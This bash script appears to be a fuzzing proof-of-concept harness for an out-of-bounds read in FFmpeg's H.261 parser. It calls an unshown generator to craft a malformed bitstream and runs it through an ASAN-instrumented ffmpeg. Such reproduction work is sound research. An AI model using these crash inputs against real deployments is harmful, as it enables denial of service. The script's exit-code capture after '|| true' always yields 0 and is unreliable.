#!/usr/bin/env bash
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
FFMPEG="/data/ylwang/non-textfuzz/target/FFmpeg/build_test/ffmpeg"
INPUT="${SCRIPT_DIR}/vuln_001_input.h261"
GENERATOR="${SCRIPT_DIR}/vuln_001_gen.py"

echo "=== VULN-001 PoC: h261_find_frame_end OOB Read ==="
echo ""

# Generate the malformed input
echo "[*] Generating crafted H.261 bitstream..."
python3 "${GENERATOR}"
echo ""

# Confirm file exists
if [ ! -f "${INPUT}" ]; then
    echo "[!] Input file not generated: ${INPUT}"
    exit 1
fi
echo "[*] Input file: ${INPUT} ($(wc -c < "${INPUT}") bytes)"
echo ""

# Check ASAN is available (expect the build has ASAN)
if [ ! -x "${FFMPEG}" ]; then
    echo "[!] ffmpeg binary not found: ${FFMPEG}"
    exit 1
fi
echo "[*] ffmpeg binary: ${FFMPEG}"
echo ""

# Set ASAN options for better crash reporting
export ASAN_OPTIONS="halt_on_error=1:abort_on_error=1:print_stats=0"

echo "[*] Running: ${FFMPEG} -f h261 -i ${INPUT} -f null -"
echo "--- ffmpeg output ---"
"${FFMPEG}" -f h261 -i "${INPUT}" -f null - 2>&1 || true
EXIT=$?
echo "--- end ffmpeg output ---"
echo ""
echo "[*] Run complete."
echo "EXIT=${EXIT}"
